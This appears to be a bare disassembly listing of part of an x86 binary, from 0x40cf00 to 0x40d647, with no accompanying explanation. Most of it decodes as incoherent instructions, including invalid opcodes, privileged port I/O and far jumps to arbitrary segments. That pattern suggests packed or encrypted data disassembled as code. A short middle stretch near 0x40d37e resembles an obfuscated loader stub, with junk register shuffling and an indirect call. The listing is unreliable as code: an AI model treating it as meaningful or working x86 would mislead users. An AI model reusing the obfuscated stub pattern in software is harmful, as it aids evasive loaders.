  40cf00:	adc    al,BYTE PTR [ebx+0x53ac7ed9]
  40cf06:	push   ebp
  40cf07:	jb     0x40cf0f
  40cf09:	lds    ebx,FWORD PTR [ebp-0x1b6c2e65]
  40cf0f:	mov    ds:0xe3e1f3e5,al
  40cf14:	xchg   ebp,eax
  40cf15:	push   edx
  40cf16:	push   edx
  40cf17:	test   DWORD PTR [ebx-0x3dc75342],edx
  40cf1d:	pop    ebx
  40cf1e:	mov    bh,0x83
  40cf20:	fs push ebp
  40cf22:	xchg   esp,eax
  40cf23:	mov    bl,0x8e
  40cf25:	jg     0x40cf4d
  40cf27:	push   esi
  40cf28:	clc    
  40cf29:	hlt    
  40cf2a:	sbb    ecx,DWORD PTR [eax+eax*2+0x64d00274]
  40cf31:	jb     0x40cf93
  40cf33:	shr    BYTE PTR [eax+ecx*1-0x4f211d14],0x56
  40cf3b:	mov    bl,0x13
  40cf3d:	mov    BYTE PTR [edi+0x517b6af],ah
  40cf43:	pop    ds
  40cf44:	shl    BYTE PTR [ebp-0x67007af],cl
  40cf4a:	xlat   BYTE PTR ds:[ebx]
  40cf4b:	dec    esp
  40cf4c:	fcmovu st,st(6)
  40cf4e:	int3   
  40cf4f:	ja     0x40cf42
  40cf51:	jmp    0xbbd2:0x166f8e33
  40cf58:	xlat   BYTE PTR ds:[ebx]
  40cf59:	and    esp,DWORD PTR [edi]
  40cf5b:	mov    ch,0x5
  40cf5d:	shr    BYTE PTR [ebp+0x45],1
  40cf60:	jne    0x40cefa
  40cf62:	ror    cl,cl
  40cf64:	in     al,dx
  40cf65:	jns    0x40cf46
  40cf67:	dec    edi
  40cf68:	pop    ebx
  40cf69:	jne    0x40cf4c
  40cf6b:	pushf  
  40cf6c:	lods   eax,DWORD PTR ds:[esi]
  40cf6d:	sub    al,BYTE PTR [eax+0x1b]
  40cf70:	neg    BYTE PTR [si]
  40cf73:	lods   al,BYTE PTR ds:[esi]
  40cf74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf75:	sub    BYTE PTR ss:[esi-0x19217f1e],dl
  40cf7c:	pop    es
  40cf7d:	out    0x8b,al
  40cf7f:	in     al,dx
  40cf80:	loopne 0x40cfb7
  40cf82:	ret    
  40cf83:	bound  ebx,QWORD PTR [esi+0x4db0d703]
  40cf89:	sub    eax,0x63b2773e
  40cf8e:	into   
  40cf8f:	dec    esp
  40cf90:	or     ecx,DWORD PTR [edi+edx*2]
  40cf93:	hlt    
  40cf94:	pop    esi
  40cf95:	aas    
  40cf96:	rcr    DWORD PTR [edx+0x29],cl
  40cf99:	push   ss
  40cf9a:	cli    
  40cf9b:	sub    eax,0x1de861be
  40cfa0:	mov    edi,0xde27034f
  40cfa5:	test   BYTE PTR [eax+0x7a8efeba],cl
  40cfab:	push   es
  40cfac:	(bad)  
  40cfad:	(bad)  
  40cfae:	pop    edi
  40cfaf:	mov    al,ds:0xbb894b1d
  40cfb4:	add    ebp,DWORD PTR [ebp-0x3a8d3dd7]
  40cfba:	or     ah,BYTE PTR [ecx+0x6c]
  40cfbd:	lea    eax,[edi]
  40cfbf:	pop    esp
  40cfc0:	mov    bl,0x55
  40cfc2:	dec    bh
  40cfc4:	(bad)  
  40cfc5:	lods   eax,DWORD PTR ds:[esi]
  40cfc6:	jnp    0x40d040
  40cfc8:	clc    
  40cfc9:	dec    ebp
  40cfca:	jp     0x40cfa2
  40cfcc:	push   edx
  40cfcd:	shl    BYTE PTR [ebx],0x65
  40cfd0:	inc    ebp
  40cfd1:	popf   
  40cfd2:	cmp    ecx,ebp
  40cfd4:	xchg   edx,eax
  40cfd5:	sub    DWORD PTR [edi-0x57],edx
  40cfd8:	in     eax,dx
  40cfd9:	fsub   DWORD PTR [ebx]
  40cfdb:	push   ebx
  40cfdc:	ret    0x4469
  40cfdf:	iret   
  40cfe0:	(bad)  
  40cfe1:	sub    ebp,ebp
  40cfe3:	and    BYTE PTR [eax],dl
  40cfe5:	dec    eax
  40cfe6:	test   BYTE PTR fs:[eax+0x103c0aa7],bh
  40cfed:	jne    0x40d04d
  40cfef:	(bad)  [ecx+0x51f0fc66]
  40cff6:	clc    
  40cff7:	mov    esi,0xa40581a1
  40cffc:	pop    eax
  40cffd:	aam    0x88
  40cfff:	or     DWORD PTR [edi+0x2f],esp
  40d002:	mov    ebp,0xfb463763
  40d007:	test   al,dl
  40d009:	cwde   
  40d00a:	stos   DWORD PTR es:[edi],eax
  40d00b:	sahf   
  40d00c:	sub    al,0xd0
  40d00e:	ror    DWORD PTR [esi],1
  40d010:	dec    edx
  40d011:	pop    ebp
  40d012:	outs   dx,DWORD PTR ds:[esi]
  40d013:	and    bh,ch
  40d015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d016:	in     al,0xd5
  40d018:	dec    ebp
  40d019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d01a:	jnp    0x40d02a
  40d01c:	jl     0x40d002
  40d01e:	daa    
  40d01f:	dec    ecx
  40d020:	adc    eax,0x90271515
  40d025:	mov    al,0xc1
  40d027:	xor    ah,bh
  40d029:	mov    bl,0xed
  40d02b:	scas   al,BYTE PTR es:[edi]
  40d02c:	dec    ecx
  40d02d:	jp     0x40d04d
  40d02f:	(bad)  
  40d030:	xor    ecx,DWORD PTR [edx+0x591f6392]
  40d036:	icebp  
  40d037:	daa    
  40d038:	sub    DWORD PTR [ebx-0x31],0xddee83f
  40d03f:	leave  
  40d040:	push   ds
  40d041:	lahf   
  40d042:	lea    ecx,[eax]
  40d044:	shr    ch,1
  40d046:	pop    ecx
  40d047:	xchg   ecx,eax
  40d048:	mov    eax,ds:0xb5fe2018
  40d04d:	jb     0x40cfeb
  40d04f:	push   ss
  40d050:	repnz dec ebp
  40d052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d053:	fwait
  40d054:	(bad)  
  40d055:	lock jnp 0x40d0d5
  40d058:	pushf  
  40d059:	sub    DWORD PTR [esi+0x4b],edi
  40d05c:	outs   dx,DWORD PTR ds:[esi]
  40d05d:	sar    bl,cl
  40d05f:	cdq    
  40d060:	mov    ch,0xe2
  40d062:	in     al,dx
  40d063:	fwait
  40d064:	or     esi,DWORD PTR [edx+0x64bdcae9]
  40d06a:	ret    0xaf0a
  40d06d:	pushf  
  40d06e:	jmp    DWORD PTR [edx+0x2a9a0d0f]
  40d074:	dec    ecx
  40d075:	aam    0xf6
  40d077:	pop    ss
  40d078:	or     al,al
  40d07a:	xor    al,0x5f
  40d07c:	sub    ecx,DWORD PTR [edx]
  40d07e:	clc    
  40d07f:	not    cl
  40d081:	xchg   DWORD PTR [eax-0x4696b307],edi
  40d087:	mov    esp,0xc7a2e949
  40d08c:	call   0x9339:0xe98d265
  40d093:	inc    ebp
  40d094:	sub    al,0xe
  40d096:	xchg   DWORD PTR [ecx-0x44c4a046],ebp
  40d09c:	xchg   BYTE PTR fs:[esp+ebp*4-0x598a054f],ah
  40d0a4:	push   es
  40d0a5:	mov    cs,WORD PTR [eax]
  40d0a7:	jb     0x40d0a8
  40d0a9:	push   esp
  40d0aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0ab:	(bad)  
  40d0ac:	enter  0xcc5f,0x65
  40d0b0:	fcom   QWORD PTR [esi+0x7ca8c202]
  40d0b6:	cmp    eax,0x16e0a957
  40d0bb:	int3   
  40d0bc:	ret    0x4fe3
  40d0bf:	adc    edi,DWORD PTR [edx-0x64]
  40d0c2:	dec    esi
  40d0c3:	fstp   DWORD PTR [ebx+0x11ee7c67]
  40d0c9:	icebp  
  40d0ca:	test   BYTE PTR ds:[ecx-0x7a61b25b],0x3
  40d0d2:	jbe    0x40d0fb
  40d0d4:	mov    cl,0xa1
  40d0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d7:	mov    edi,0xbaedcfe8
  40d0dc:	xchg   ebx,eax
  40d0dd:	and    DWORD PTR [ebp-0x7da947d6],0x3e
  40d0e4:	dec    ebp
  40d0e5:	push   cs
  40d0e6:	popf   
  40d0e7:	mov    ah,0x5c
  40d0e9:	xor    al,0x8a
  40d0eb:	pop    ebx
  40d0ec:	mov    ah,0x79
  40d0ee:	iret   
  40d0ef:	test   esi,ebx
  40d0f1:	adc    cl,BYTE PTR [edx]
  40d0f3:	ror    DWORD PTR [ecx],0x96
  40d0f6:	mov    ds:0xd5baa590,eax
  40d0fb:	cmp    eax,esp
  40d0fd:	neg    ecx
  40d0ff:	or     BYTE PTR ds:0x12f3139,dl
  40d105:	and    BYTE PTR [ecx-0x5866c140],ah
  40d10b:	inc    esp
  40d10c:	mov    ch,0xfc
  40d10e:	mov    ah,0x6f
  40d110:	(bad)  
  40d111:	aaa    
  40d112:	xchg   ebx,eax
  40d113:	int3   
  40d114:	es jo  0x40d131
  40d117:	and    dh,BYTE PTR [edx+0x46c8a6a2]
  40d11d:	cli    
  40d11e:	retf   
  40d11f:	adc    eax,0x6a2b6ace
  40d124:	mov    ch,0xc1
  40d126:	outs   dx,DWORD PTR ds:[esi]
  40d127:	imul   esi,ebp,0xffffffa8
  40d12a:	(bad)  
  40d12b:	xchg   ebx,eax
  40d12c:	inc    edx
  40d12d:	push   0xffffffca
  40d12f:	ret    
  40d130:	or     eax,0x99e5321a
  40d135:	inc    ecx
  40d136:	or     ebp,DWORD PTR [edx+0x2f1ab973]
  40d13c:	jae    0x40d0fb
  40d13e:	sbb    ch,BYTE PTR [ecx+edx*4+0x3d5a9a80]
  40d145:	pop    edx
  40d146:	dec    ecx
  40d147:	mov    WORD PTR [ecx],cs
  40d149:	ds in  al,dx
  40d14b:	or     DWORD PTR [edx],ebx
  40d14d:	mov    bh,0x59
  40d14f:	addr16 sbb al,0x7c
  40d152:	test   al,0xcd
  40d154:	sbb    al,0x2d
  40d156:	bound  ebx,QWORD PTR [edx]
  40d158:	jle    0x40d1d5
  40d15a:	mov    bh,0x63
  40d15c:	ret    0x670f
  40d15f:	add    DWORD PTR [ebx],ebp
  40d161:	jg     0x40d19f
  40d163:	int3   
  40d164:	mov    cl,bl
  40d166:	inc    ebx
  40d167:	mov    edx,0xdb1873e5
  40d16c:	ins    DWORD PTR es:[edi],dx
  40d16d:	loop   0x40d1b7
  40d16f:	dec    edi
  40d170:	les    edi,FWORD PTR [eax+0x1fc4061c]
  40d176:	jl     0x40d1b6
  40d178:	mov    edi,0x3f0734ee
  40d17d:	fucom  st(3)
  40d17f:	das    
  40d180:	xchg   edi,eax
  40d181:	test   eax,0xec0ee36
  40d186:	scas   eax,DWORD PTR es:[edi]
  40d187:	push   ebx
  40d188:	fisub  WORD PTR [edx-0x27]
  40d18b:	test   eax,0xaa0376d4
  40d190:	pusha  
  40d191:	xlat   BYTE PTR ds:[ebx]
  40d192:	lods   eax,DWORD PTR ds:[esi]
  40d193:	mov    ds:0x4dab368d,al
  40d198:	push   ebx
  40d199:	jne    0x40d1ef
  40d19b:	or     DWORD PTR [edx+0x43236ca7],eax
  40d1a1:	adc    eax,0x504459ee
  40d1a6:	daa    
  40d1a7:	xlat   BYTE PTR ds:[ebx]
  40d1a8:	dec    ebx
  40d1a9:	inc    ebx
  40d1aa:	out    dx,eax
  40d1ab:	sbb    al,0x48
  40d1ad:	and    eax,0xe380a1b1
  40d1b2:	sub    eax,0xe2116070
  40d1b7:	retf   0x9094
  40d1ba:	or     ecx,ecx
  40d1bc:	push   ecx
  40d1bd:	add    al,0xf3
  40d1bf:	imul   ebx,DWORD PTR [ebx],0x3d
  40d1c2:	push   ebp
  40d1c3:	and    eax,0xb9a07acd
  40d1c8:	xchg   BYTE PTR [ecx+0x113b86eb],bl
  40d1ce:	int    0x31
  40d1d0:	add    al,0x5
  40d1d2:	pop    es
  40d1d3:	scas   eax,DWORD PTR es:[edi]
  40d1d4:	pop    ss
  40d1d5:	aam    0x9a
  40d1d7:	sbb    BYTE PTR [esp-0x56efb648],al
  40d1de:	xchg   DWORD PTR [edx+0x1],esp
  40d1e1:	jnp    0x40d1bc
  40d1e3:	(bad)  
  40d1e4:	cdq    
  40d1e5:	pop    edi
  40d1e6:	xchg   ecx,eax
  40d1e7:	and    DWORD PTR [esi-0x26],ebx
  40d1ea:	ins    DWORD PTR es:[edi],dx
  40d1eb:	jmp    0xdf39c626
  40d1f0:	mov    cl,0xf7
  40d1f2:	hlt    
  40d1f3:	adc    eax,0x60d819e1
  40d1f8:	pop    esp
  40d1f9:	outs   dx,BYTE PTR ds:[esi]
  40d1fa:	mov    ebx,0x4182bcc
  40d1ff:	dec    ebp
  40d200:	daa    
  40d201:	dec    edi
  40d202:	out    0xd6,eax
  40d204:	cmp    DWORD PTR [esi-0x701f0837],esp
  40d20a:	xchg   esi,eax
  40d20b:	dec    edx
  40d20c:	sub    BYTE PTR [ecx+0x3b],0xfc
  40d210:	stc    
  40d211:	dec    edx
  40d212:	aaa    
  40d213:	jmp    0x40d1f4
  40d215:	sahf   
  40d216:	fisubr WORD PTR [edi+0x4b478579]
  40d21c:	arpl   sp,cx
  40d21e:	add    eax,0xec6cc93
  40d223:	sbb    eax,0x78b652d2
  40d228:	es es pop es
  40d22b:	and    eax,0x1654d102
  40d230:	xchg   ebx,eax
  40d231:	pop    ecx
  40d232:	repnz or ah,bh
  40d235:	aaa    
  40d236:	(bad)  
  40d237:	dec    ecx
  40d238:	push   0x4d
  40d23a:	test   al,0xa1
  40d23c:	pop    esp
  40d23d:	xchg   esi,eax
  40d23e:	push   0x339f7baf
  40d243:	push   ds
  40d244:	int3   
  40d245:	ror    DWORD PTR [esi],cl
  40d247:	dec    eax
  40d248:	out    0x92,eax
  40d24a:	dec    ebx
  40d24b:	adc    eax,0xb4451cf5
  40d250:	xlat   BYTE PTR ds:[ebx]
  40d251:	fadd   QWORD PTR [ebp-0x1b040dbe]
  40d257:	pop    esp
  40d258:	sahf   
  40d259:	xchg   edi,eax
  40d25a:	pop    esp
  40d25b:	ins    BYTE PTR es:[edi],dx
  40d25c:	loope  0x40d2a7
  40d25e:	mul    esi
  40d260:	push   ss
  40d261:	test   eax,esi
  40d263:	cmp    eax,0xfb958c0d
  40d268:	or     eax,0xf4f831c
  40d26d:	mov    ds:0x8e5103e0,eax
  40d272:	scas   eax,DWORD PTR es:[edi]
  40d273:	xlat   BYTE PTR ds:[ebx]
  40d274:	push   ebx
  40d275:	in     al,0xef
  40d277:	jns    0x40d2c0
  40d279:	and    ch,ch
  40d27b:	sbb    eax,DWORD PTR [eax+0x1b]
  40d27e:	lock push ecx
  40d280:	lods   eax,DWORD PTR ds:[esi]
  40d281:	ror    DWORD PTR [ecx-0xf],1
  40d284:	jmp    0x779e556f
  40d289:	aas    
  40d28a:	mov    edi,0x2d13818b
  40d28f:	cmp    cl,bl
  40d291:	mov    esp,0x85199978
  40d296:	push   0x1c5b980d
  40d29b:	popf   
  40d29c:	and    ebp,ebx
  40d29e:	hlt    
  40d29f:	fstp   QWORD PTR [ebp+0x7]
  40d2a2:	mov    edi,0xeda6adee
  40d2a7:	lock out 0x4e,al
  40d2aa:	jmp    0xbe991f
  40d2af:	pop    es
  40d2b0:	jne    0x40d287
  40d2b2:	outs   dx,DWORD PTR ds:[esi]
  40d2b3:	aaa    
  40d2b4:	leave  
  40d2b5:	test   DWORD PTR [ebx+ebp*1-0x391cfaa7],esi
  40d2bc:	cmp    esp,DWORD PTR [ecx+0x45bfc908]
  40d2c2:	or     eax,0x7d44a963
  40d2c7:	sub    BYTE PTR [esi+0x2f],dl
  40d2ca:	inc    ebp
  40d2cb:	test   ch,0x6f
  40d2ce:	push   0xed37289e
  40d2d3:	imul   edx,esi,0x71
  40d2d6:	fsubrp st(1),st
  40d2d8:	leave  
  40d2d9:	outs   dx,BYTE PTR ds:[esi]
  40d2da:	push   ss
  40d2db:	pop    edx
  40d2dc:	enter  0x1fb4,0x4b
  40d2e0:	mov    ds:0x8055f59a,eax
  40d2e5:	outs   dx,DWORD PTR ds:[esi]
  40d2e6:	adc    ecx,edi
  40d2e8:	push   edi
  40d2e9:	push   0xc79dd878
  40d2ee:	ds sahf 
  40d2f0:	add    al,0x6c
  40d2f2:	dec    ebx
  40d2f3:	add    ebx,ecx
  40d2f5:	out    dx,eax
  40d2f6:	or     edx,eax
  40d2f8:	and    DWORD PTR [ebp+0x53],ecx
  40d2fb:	dec    esi
  40d2fc:	push   edx
  40d2fd:	cmp    DWORD PTR [ebx-0x34],0xffffff8c
  40d301:	jo     0x40d2de
  40d303:	nop
  40d304:	jge    0x40d369
  40d306:	adc    BYTE PTR [ebx-0x74292914],dh
  40d30c:	into   
  40d30d:	cmp    DWORD PTR [esi+0x7b],ebx
  40d310:	jg     0x40d2de
  40d312:	or     eax,0x2d909a02
  40d317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d318:	add    bh,ah
  40d31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31b:	mov    edx,0xb22b6f56
  40d320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d321:	stos   DWORD PTR es:[edi],eax
  40d322:	clc    
  40d323:	and    al,BYTE PTR [eax-0x6348f490]
  40d329:	(bad)  
  40d32a:	cld    
  40d32b:	outs   dx,DWORD PTR ds:[esi]
  40d32c:	sub    DWORD PTR [ebp+0x5e3e9967],esi
  40d332:	ldmxcsr DWORD PTR [edx]
  40d335:	iret   
  40d336:	xchg   ebp,eax
  40d337:	push   esp
  40d338:	ret    
  40d339:	into   
  40d33a:	fistp  DWORD PTR [bx+si]
  40d33d:	ret    
  40d33e:	arpl   WORD PTR [ecx],si
  40d340:	les    edx,FWORD PTR [edx+0x73]
  40d343:	(bad)  
  40d344:	xor    eax,0x393033fb
  40d349:	js     0x40d317
  40d34b:	sub    ebx,edi
  40d34d:	arpl   si,cx
  40d34f:	cli    
  40d350:	mov    WORD PTR [edi],?
  40d352:	sbb    BYTE PTR [edx-0x3157c0c],al
  40d358:	sar    BYTE PTR ds:0x49fdd66b,cl
  40d35e:	rcr    DWORD PTR [ecx],cl
  40d360:	dec    esi
  40d361:	pop    ss
  40d362:	cmp    DWORD PTR [ecx+eax*1],0xffffffd9
  40d366:	push   eax
  40d367:	and    eax,edx
  40d369:	mov    ds:0x55fa9d50,eax
  40d36e:	push   0x1a
  40d370:	call   0x9788:0x30942a7a
  40d377:	mov    bh,0x91
  40d379:	call   0x4c58f42e
  40d37e:	add    ebx,0x1002
  40d384:	lea    eax,[ebp-0x18]
  40d387:	add    edx,eax
  40d389:	add    edx,0x5
  40d38c:	push   edx
  40d38d:	inc    esi
  40d38e:	pop    ecx
  40d38f:	dec    ecx
  40d390:	xchg   ecx,eax
  40d391:	dec    eax
  40d392:	xchg   ecx,eax
  40d393:	dec    ecx
  40d394:	xchg   ecx,edx
  40d396:	dec    edx
  40d397:	push   edx
  40d398:	mov    edx,ebx
  40d39a:	pop    ebx
  40d39b:	dec    ebx
  40d39c:	call   DWORD PTR [ebx]
  40d39e:	cmp    DWORD PTR [ebp+0x10],esi
  40d3a1:	je     0x40f754
  40d3a7:	xchg   edx,eax
  40d3a8:	push   0xc
  40d3aa:	pop    ecx
  40d3ab:	dec    ecx
  40d3ac:	push   0x3
  40d3ae:	pop    ebx
  40d3af:	inc    ebx
  40d3b0:	xchg   ebx,ecx
  40d3b2:	inc    ecx
  40d3b3:	sub    ebx,ecx
  40d3b5:	xchg   ebx,ecx
  40d3b7:	dec    ecx
  40d3b8:	dec    ecx
  40d3b9:	mov    eax,DWORD PTR [ebp-0x1c]
  40d3bc:	imul   eax,ecx
  40d3bf:	jmp    0x40f751
  40d3c4:	inc    eax
  40d3c5:	sbb    edx,DWORD PTR [ebp-0x1e]
  40d3c8:	push   edx
  40d3c9:	mov    ds:0x35198590,al
  40d3ce:	aad    0x91
  40d3d0:	xchg   ebp,eax
  40d3d1:	push   eax
  40d3d2:	mov    WORD PTR [ebp-0x7c7c2c4e],ds
  40d3d8:	or     al,0x5e
  40d3da:	add    DWORD PTR [ebx-0x2bd2289d],0xffffffbd
  40d3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3e2:	push   ebx
  40d3e3:	add    DWORD PTR [ebp+0x31f9e1c2],ebp
  40d3e9:	xchg   ebx,eax
  40d3ea:	test   al,0x8
  40d3ec:	add    al,0x44
  40d3ee:	cli    
  40d3ef:	scas   eax,DWORD PTR es:[edi]
  40d3f0:	rcl    BYTE PTR [edx-0x2e],0x92
  40d3f4:	jnp    0x40d3ee
  40d3f6:	or     al,0xf7
  40d3f8:	retf   
  40d3f9:	mov    ds:0xaf713ef7,eax
  40d3fe:	sub    eax,DWORD PTR [ecx-0x4200d99d]
  40d404:	retf   
  40d405:	mov    DWORD PTR [esi],edx
  40d407:	(bad)  
  40d408:	icebp  
  40d409:	fld    TBYTE PTR [eax-0xc]
  40d40c:	cmp    al,BYTE PTR [edi-0x7c]
  40d40f:	dec    eax
  40d410:	push   0x93be6779
  40d415:	cld    
  40d416:	dec    ebp
  40d417:	sti    
  40d418:	mov    cl,0x1
  40d41a:	sub    eax,0x6966346b
  40d41f:	test   eax,0xd764318
  40d424:	test   al,0xb5
  40d426:	push   eax
  40d427:	push   cs
  40d428:	pop    ds
  40d429:	mov    ds:0xbe40ed42,al
  40d42e:	ret    0x76e9
  40d431:	xor    cl,dl
  40d433:	addr16 and al,0xe8
  40d436:	mov    esp,0x5d35c3bc
  40d43b:	mov    dh,0x37
  40d43d:	fistp  DWORD PTR [edx-0x1f30f8ac]
  40d443:	inc    ecx
  40d444:	out    0xca,al
  40d446:	stc    
  40d447:	sbb    DWORD PTR [edx-0x22],ebp
  40d44a:	adc    esi,ebx
  40d44c:	mov    dl,0xbf
  40d44e:	cmp    al,0x0
  40d450:	or     dl,BYTE PTR [esi]
  40d452:	xchg   BYTE PTR [edx],dh
  40d454:	lahf   
  40d455:	(bad)  
  40d456:	icebp  
  40d457:	js     0x40d4ad
  40d459:	dec    edx
  40d45a:	pop    esi
  40d45b:	and    BYTE PTR [ebp-0x26d393c7],bh
  40d461:	in     al,dx
  40d462:	adc    BYTE PTR [ecx*8-0x1faa7fa3],dh
  40d469:	loop   0x40d4c1
  40d46b:	jmp    0x40d4cc
  40d46d:	sub    esp,DWORD PTR [ebx+0x678780f1]
  40d473:	mov    edi,?
  40d475:	jecxz  0x40d42a
  40d477:	mov    ds,esp
  40d479:	pop    ss
  40d47a:	adc    BYTE PTR [ebx],0xa2
  40d47d:	push   es
  40d47e:	daa    
  40d47f:	imul   ecx,DWORD PTR [ebp+0x54d0e02d],0x7c
  40d486:	jmp    0x79c0:0xd46ae8da
  40d48d:	pop    ebx
  40d48e:	adc    ecx,DWORD PTR ds:0xebd6c8a
  40d494:	nop
  40d495:	(bad)  
  40d496:	mov    edi,0x69a2b3fb
  40d49b:	inc    esp
  40d49c:	idiv   DWORD PTR [edx-0x6a]
  40d49f:	pop    edi
  40d4a0:	imul   edx,ecx,0x79
  40d4a3:	daa    
  40d4a4:	push   ss
  40d4a5:	iret   
  40d4a6:	mov    eax,DWORD PTR [edi+0x351db38b]
  40d4ac:	ja     0x40d493
  40d4ae:	dec    eax
  40d4af:	arpl   WORD PTR [edi+0x61],ax
  40d4b2:	xchg   ebp,eax
  40d4b3:	xchg   ecx,eax
  40d4b4:	push   eax
  40d4b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4b6:	fcmovnb st,st(4)
  40d4b8:	inc    esi
  40d4b9:	add    al,0x4c
  40d4bb:	retf   
  40d4bc:	and    ch,BYTE PTR [esi]
  40d4be:	dec    esi
  40d4bf:	int    0x30
  40d4c1:	sbb    al,0x9b
  40d4c3:	cmp    ebp,ebx
  40d4c5:	test   BYTE PTR [ebp+ebx*4+0x7ae562bd],ch
  40d4cc:	push   ebp
  40d4cd:	pop    esi
  40d4ce:	in     al,0x2
  40d4d0:	ret    
  40d4d1:	dec    esp
  40d4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d3:	repnz xchg esp,eax
  40d4d5:	push   ebp
  40d4d6:	sub    dh,cl
  40d4d8:	dec    edi
  40d4d9:	call   0x73a1:0x7f0e06a3
  40d4e0:	mov    ch,0x65
  40d4e2:	ret    0x3717
  40d4e5:	and    al,0x6b
  40d4e7:	inc    ebx
  40d4e8:	or     BYTE PTR [ebx+0x4a],0x8e
  40d4ec:	mov    ebp,0x8c527286
  40d4f1:	stc    
  40d4f2:	fs inc ebx
  40d4f4:	adc    eax,0xa7e667d6
  40d4f9:	out    0x3a,al
  40d4fb:	xlat   BYTE PTR ds:[ebx]
  40d4fc:	mov    al,dl
  40d4fe:	xchg   ebx,eax
  40d4ff:	dec    edi
  40d500:	cmp    eax,0xe5a53897
  40d505:	push   es
  40d506:	cmp    eax,ebp
  40d508:	sub    DWORD PTR [edx+0x928726e],edi
  40d50e:	sbb    dh,BYTE PTR [ebp+0x454a1cab]
  40d514:	imul   edx,DWORD PTR [edx-0x888848d],0x58
  40d51b:	(bad)  
  40d51c:	rcl    DWORD PTR [edi],1
  40d51e:	inc    eax
  40d51f:	(bad)  
  40d520:	imul   ebp,DWORD PTR [edi],0x25
  40d523:	les    ebp,FWORD PTR [ecx-0x5d]
  40d526:	cs ins DWORD PTR es:[edi],dx
  40d528:	sahf   
  40d529:	or     ecx,DWORD PTR ss:0x31bbda9a
  40d530:	dec    esp
  40d531:	cmp    DWORD PTR [edx+0x1e43a83],0x34
  40d538:	das    
  40d539:	mov    esi,0x7d69dac4
  40d53e:	jo     0x40d509
  40d540:	out    0xd9,al
  40d542:	mov    dl,BYTE PTR [edx]
  40d544:	loope  0x40d5ae
  40d546:	out    0xa3,eax
  40d548:	xchg   ebp,eax
  40d549:	test   BYTE PTR [ebp-0x6406d83d],0xa3
  40d550:	daa    
  40d551:	(bad)  
  40d552:	xor    al,al
  40d554:	xchg   edi,eax
  40d555:	ins    BYTE PTR es:[edi],dx
  40d556:	cld    
  40d557:	cmp    bl,0xf5
  40d55a:	lahf   
  40d55b:	mov    ds,WORD PTR [esi]
  40d55d:	sub    ecx,DWORD PTR [esi+ecx*8+0x108d54c9]
  40d564:	fwait
  40d565:	sbb    DWORD PTR [eax+0x2eb69930],ecx
  40d56b:	jne    0x40d55c
  40d56d:	xchg   edx,eax
  40d56e:	jmp    ebp
  40d570:	test   eax,0x85005bbb
  40d575:	inc    eax
  40d576:	and    DWORD PTR [esi],eax
  40d578:	inc    edx
  40d579:	dec    DWORD PTR [esi]
  40d57b:	push   edi
  40d57c:	retf   0x731e
  40d57f:	mov    edx,0x17386099
  40d584:	mov    ch,0x91
  40d586:	xchg   ebp,eax
  40d587:	mov    al,ds:0x46896239
  40d58c:	(bad)  
  40d58d:	mov    ds:0xc2d1afa1,al
  40d592:	dec    edx
  40d593:	mov    ebx,0xd3956fc
  40d598:	mov    bl,0xe1
  40d59a:	cmp    DWORD PTR [ecx+ebx*4+0x69],esp
  40d59e:	mov    ebx,0xb86c5eab
  40d5a3:	mov    ch,0x88
  40d5a5:	xchg   esp,eax
  40d5a6:	push   0xffffffa8
  40d5a8:	add    al,0x20
  40d5aa:	repnz (bad) 
  40d5ac:	dec    esp
  40d5ad:	out    0x12,al
  40d5af:	dec    esp
  40d5b0:	mov    ds:0xf191cc7e,eax
  40d5b5:	dec    esi
  40d5b6:	enter  0x1728,0x8b
  40d5ba:	clc    
  40d5bb:	xor    DWORD PTR ds:0xd277155f,ebp
  40d5c1:	dec    ebx
  40d5c2:	adc    esp,DWORD PTR [esi]
  40d5c4:	and    BYTE PTR [edx],ch
  40d5c6:	sbb    DWORD PTR [ecx-0x34c83b63],esp
  40d5cc:	mov    ds:0x8de16578,eax
  40d5d1:	pop    ebp
  40d5d2:	outs   dx,BYTE PTR ds:[esi]
  40d5d3:	mov    edx,edx
  40d5d5:	add    BYTE PTR [edi],ah
  40d5d7:	out    0xd6,eax
  40d5d9:	inc    ebx
  40d5da:	adc    edx,ebp
  40d5dc:	sbb    al,0xae
  40d5de:	adc    BYTE PTR [ecx+0x696642a],bh
  40d5e4:	jae    0x40d615
  40d5e6:	push   es
  40d5e7:	fwait
  40d5e8:	les    edx,FWORD PTR [edx+0x28]
  40d5eb:	adc    bl,BYTE PTR [edx]
  40d5ed:	mov    esp,0xa3bda27c
  40d5f2:	loope  0x40d644
  40d5f4:	sbb    ch,BYTE PTR [ebp-0x6361de6a]
  40d5fa:	cdq    
  40d5fb:	test   al,0x16
  40d5fd:	and    bh,0x42
  40d600:	inc    ebp
  40d601:	pop    esp
  40d602:	into   
  40d603:	out    dx,eax
  40d604:	fmul   DWORD PTR [edx-0xfc2af20]
  40d60a:	xchg   ebx,ebp
  40d60c:	add    eax,DWORD PTR [edx]
  40d60e:	test   eax,0xf13cef65
  40d613:	es int3 
  40d615:	inc    ebx
  40d616:	les    ebx,FWORD PTR [esi]
  40d618:	pop    es
  40d619:	das    
  40d61a:	jmp    0x40d5fa
  40d61c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d61d:	push   esi
  40d61e:	in     eax,dx
  40d61f:	jnp    0x40d63b
  40d621:	mov    esi,0xbe3ea24f
  40d626:	lahf   
  40d627:	fild   QWORD PTR [edi+0x35]
  40d62a:	jae    0x40d67b
  40d62c:	scas   eax,DWORD PTR es:[edi]
  40d62d:	in     eax,dx
  40d62e:	es mov dh,0x1e
  40d631:	jns    0x40d5f4
  40d633:	popf   
  40d634:	jecxz  0x40d64d
  40d636:	or     dh,BYTE PTR [edi+0x10]
  40d639:	les    ebp,FWORD PTR [ecx+edx*8-0x7c]
  40d63d:	sbb    BYTE PTR [edx-0x78],bl
  40d640:	mov    ebp,0xf209281f
  40d645:	cli    
  40d646:	dec    edi
  40d647:	loop   0x40d6bb
